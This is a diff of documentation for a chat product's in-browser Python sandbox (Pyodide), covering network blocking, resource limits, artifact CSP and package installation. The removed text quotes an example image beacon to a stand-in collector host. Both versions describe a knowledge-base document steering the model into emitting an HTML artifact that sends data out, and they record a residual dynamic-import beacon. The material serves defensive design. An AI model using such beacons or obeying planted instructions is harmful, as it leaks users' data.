@@ -1,152 +1,69 @@
-# Client-side code execution (Pyodide)
+# Python in the browser
 
-Model-written Python runs in the user's browser, inside a Web Worker wrapping
-[Pyodide](https://github.com/pyodide/pyodide) (CPython 3.14 compiled to
-WebAssembly). Code blocks in assistant messages and python code artifacts
-execute automatically when they finish streaming — no confirmation click —
-because the sandbox makes auto-run safe, and an execution result behind a
-click the person has to keep pressing is a result they will stop reading.
+Cerea runs model-written Python **in your browser**, not on the server, using
+[Pyodide](https://github.com/pyodide/pyodide) (CPython compiled to
+WebAssembly) inside a Web Worker. Python code blocks and code artifacts run by
+themselves when the answer finishes streaming, and their output appears under
+the code. Nothing is executed on the deployment, and nothing you load leaves
+your browser.
 
-## Why client-side
+## What you can do
 
-This is an EU self-hosted deployment with a privacy posture: local extractor,
-local redaction, self-hosted everything. Server-side untrusted-code execution
-would need gVisor-class isolation on the machine that holds Postgres and
-credentials, and a hole in it exposes every tenant. Client-side WASM inverts
-the stake: a sandbox escape buys the attacker the user's own tab — the same
-surface a malicious web page already has — no data leaves the browser, and
-compute costs the deployment nothing.
+- **Compute and analyse.** The interpreter ships with its standard scientific
+  packages (`numpy`, `pandas` and the rest of Pyodide's set), plus the office
+  libraries: `python-docx`, `openpyxl`, `pypdf`, `python-pptx`, `XlsxWriter`.
+- **Work on your files.** Message attachments and knowledge-base documents can
+  be loaded into the run; they appear under `/mnt/data/<filename>`.
+  Knowledge-base documents arrive as their indexed text, not the original
+  file.
+- **Get files back.** Files a run writes to its working directory are listed
+  under the output, with a download and a preview where the type allows one
+  (text, images, PDF, Word). When you ask for a file, the file is the answer
+  and the code folds behind a disclosure.
 
-## Delivery
+## Limits
 
-The Pyodide dist is served same-origin from `static/pyodide/` (gitignored,
-regenerated from the pinned npm package by `scripts/sync_pyodide.mjs`, wired as
-the predev/prebuild hook). No CDN: a third-party request for the interpreter
-would break the no-third-party posture and could drift from the tested version.
-It loads lazily — the ~12 MB wasm cost is paid on the first execution, not on
-page load.
+| | |
+|---|---|
+| Time | 20 seconds per run, then the run is stopped and a fresh interpreter is started |
+| Output | 8,000 characters per stream (stdout, stderr) |
+| Files | 50 MB per file loaded into a run |
+| Memory | the WebAssembly heap; running out raises `MemoryError` |
+| Network | none: no `fetch`, sockets, WebSockets or storage APIs, including through `pyfetch`, `micropip` or the `js` bridge |
+| First run | loads the runtime (about 12 MB) once; later runs start immediately |
 
-## Sandbox
+## Installing more packages
 
-Everything runs in a dedicated module worker (`pyodide.worker.ts`), so the main
-thread never executes model-written code and runaway code is killable.
+`micropip.install(...)` works for everything shipped with the deployment.
+Each person can also turn on, in their settings, access to the public PyPI
+index for other **pure-Python** packages. It is off by default, and it carries
+no credentials. Operators can force it off for everyone with
+`CHAT_PYODIDE_PYPI_DISABLED=true`. Compiled packages that Pyodide does not
+ship cannot be installed.
 
-- **Wall clock**: each run gets 20 s. WebAssembly has no cooperative
-  cancellation, so the stop is `Worker.terminate()`; the session is rebuilt
-  lazily and queued runs land on the fresh interpreter.
-- **Network**: the worker's `fetch` is allowlisted to same-origin `<base>/pyodide/*`
-  (the runtime's own assets — `/chat/pyodide/*` in production, `/pyodide/*` at
-  base `/`), and `XMLHttpRequest`, `WebSocket`,
-  `EventSource`, `indexedDB`, `caches`, storage and the nested `Worker`
-  constructors are deleted from the scope. Python sockets do not exist in wasm,
-  so this closes the whole surface, including `pyfetch`, `micropip` and the
-  `js` bridge. A worker `fetch` would otherwise carry the user's session cookie
-  to any URL the code names.
-- **Memory**: CPython-in-wasm has no `resource` module, so there is no hard
-  RLIMIT. Allocations past the wasm heap raise a Python `MemoryError`
-  (recovered), and genuinely pathological allocations are caught by the same
-  wall clock as busy loops. Output is capped at 8,000 characters per stream.
-- **Files**: anything loaded into the runtime is capped at 50 MB, checked
-  before the bytes leave the page (Content-Length / stream abort), and
-  re-checked in the worker. Files mount read-write under `/mnt/data`.
-  The other direction works too: files a run writes to the working directory
-  are listed under the run's output and downloadable from there — the worker
-  reads them back as transferable bytes, never through the capped text
-  output, and only from the working directory or `/mnt/data`. A clean
-  `sys.exit(0)` at the end of a script is reported as success, not an error.
+## What rendered artifacts can do
 
-## File deliverables
+HTML artifacts are previewed in sandboxed frames with no access to cookies,
+storage or the page, and a content security policy that blocks network
+requests, form submission, and remote images or media (`connect-src 'none'`,
+`form-action 'none'`, `img-src data: blob:`). Only the libraries the preview
+itself loads (Tailwind, React, Mermaid) come from their CDNs. A document in a
+knowledge base therefore cannot turn an artifact into a way to send data out.
 
-When the user asks for a file rather than code, the file is the
-deliverable: the model writes it to the working directory and says what it
-made in one line (a system-prompt convention, so it never narrates a
-run-it-yourself ritual), and the UI presents file-first. Each generated file
-gets a card with its size, a download, and an inline preview where the type
-allows one — plain text renders, images and PDFs show from a blob URL, and
-Word documents go through a tiny in-sandbox text extraction (the standard
-library's zipfile, no new dependency). In chat blocks the code folds behind
-a disclosure when files exist; where no files were produced the code renders
-exactly as before — code is never removed, only de-emphasized, and one click
-restores it.
+One residual path, for the record: code in the worker can start a dynamic
+`import()` of a remote URL. That is a one-way signal: no cookies travel, and
+nothing can be read back.
 
-## What artifacts may and may not do
+## For operators and maintainers
 
-Computation auto-runs; _rendered HTML artifacts_ do not get the network. The
-previews run in opaque-origin srcdoc iframes (`PREVIEW_SANDBOX` — no
-`allow-same-origin`, so no cookies, storage or DOM), and a CSP applied to every
-preview frame takes away what the sandbox tokens alone cannot:
-`connect-src 'none'` blocks `fetch`/XHR/WebSocket, `form-action 'none'` blocks
-form-based exfiltration, and images/media are limited to `data:`/`blob:` so a
-`<img src="https://collector.example/?d=…">` is not a beacon. The script-src
-allowlist names only the CDNs the preview wrappers themselves load (Tailwind
-Play, React UMD, Mermaid); an artifact's own code runs inline. A knowledge-base
-document instructing the model to emit an HTML artifact therefore cannot make
-the browser fetch anything.
-
-Residual risk, recorded rather than hidden: model code inside the worker can
-still trigger a dynamic `import()` of a cross-origin URL through the `js` module
-— a one-way beacon (the module loader does not go through `fetch`). Nothing is
-readable from it and no cookies travel; closing it entirely would require a
-CSP on the hashed worker script, which the deployment does not set per-URL.
-
-## Knowledge-base loading
-
-Code can analyze what the user already has. Knowledge documents are loaded as
-their **indexed text** — exactly what retrieval already serves — through
-`GET /api/v2/gateway/vector_stores/:store/files/:document/content`, behind the
-same viewer-role access checks as every other knowledge operation. Original
-binary files are deliberately not served: the gateway forwarder's comment
-reserves that decision. Chat message attachments load through the existing
-`/conversation/:id/output/:sha256` route. Mounted files appear at
-`/mnt/data/<filename>`.
-
-## Packages
-
-`micropip` is pinned same-origin: `scripts/sync_pyodide_wheels.mjs` (wired
-alongside `sync_pyodide.mjs` in `sync-pyodide`) vendors the wheels the office
-skills need — `python-docx`, `openpyxl`, `pypdf`, `python-pptx`, and their
-small pure-Python dependencies (`et-xmlfile`, `XlsxWriter`) — into
-`static/pyodide/wheels/`, plus the compiled packages those pull in (`lxml`,
-`Pillow`, `typing_extensions`) beside `pyodide-lock.json`, and `micropip`
-itself (this Pyodide build does not auto-bootstrap it). `micropip.install(...)`
-therefore also reaches anything else already in the interpreter's own
-357-package lock (`numpy`, `pandas`, and more) — those resolve through
-`pyodide.loadPackage()`'s own fallback, same origin, no code here has to name
-them.
-
-Two things worth knowing, found only by testing against a real Pyodide run
-(the version's ABI moved to `pyemscripten_2026_0_wasm32`, so wheel filenames
-are pinned exactly, not guessed):
-
-- **a flat directory of wheels does not make a bare package name
-  installable.** `micropip.install("python-docx")` resolves a name through
-  its own package-index protocol, which needs a PEP 503 "Simple" HTML index
-  page per package (`wheels/<canonical-name>.html`, linking the actual
-  wheel) — the sync script generates one per vendored package, not just the
-  `.whl` file.
-- **the compiled dependencies must sit beside `pyodide-lock.json`, not under
-  `wheels/`.** `pyodide.loadPackage()` (which micropip falls back to for
-  anything already in the lock) resolves from the interpreter's own
-  `indexURL`, never from micropip's index.
-
-A per-user setting, off by default, additionally lets `micropip` reach the
-public PyPI simple index for any other pure-Python package — the one
-deliberate hole in "same-origin only", opened solely by that person's own
-choice. It carries no session credentials cross-origin, and an admin
-kill-switch (`CHAT_PYODIDE_PYPI_DISABLED`) can force it off deployment-wide
-regardless of what any user has stored. This is still not "any wheel from
-anywhere": compiled (non-pure) packages beyond what Pyodide itself ships
-still cannot be built for wasm from a PyPI sdist, by design.
-
-Every vendored wheel's license is recorded in `static/pyodide/wheels/NOTICE.txt`
-(generated by the sync script) — all MIT/BSD/PSF, permissive and compatible
-with shipping them as static assets.
-
-## Licence
-
-Pyodide is **MPL-2.0**. The dist is served unmodified as static assets, never
-linked into first-party code, so the MPL's file-level copyleft stays inside the
-vendored files; first-party additions remain EUPL-1.2 per `LICENCE`/ADR 0001,
-and the upstream Apache-2.0 codebase is untouched. Attribution ships beside the
-runtime (`static/pyodide/NOTICE.txt`, generated by the sync script), and the
-pinned version is auditable in `package-lock.json`.
+- The runtime and the extra wheels are served from the chat's own origin
+  (`<base>/pyodide/`), with no CDN. They are generated from the pinned npm
+  package and wheel list by `scripts/sync_pyodide.mjs` and
+  `scripts/sync_pyodide_wheels.mjs`, which run before `dev` and `build`.
+- The wheel filenames are pinned exactly: `micropip` needs a PEP 503 index
+  page per package (the sync script writes them), and compiled dependencies
+  sit beside `pyodide-lock.json`.
+- **Licences:** Pyodide is MPL-2.0 and is served unmodified as static files.
+  The vendored wheels are MIT, BSD or PSF; each is listed in
+  `static/pyodide/wheels/NOTICE.txt`, and `static/pyodide/NOTICE.txt` carries
+  Pyodide's attribution.
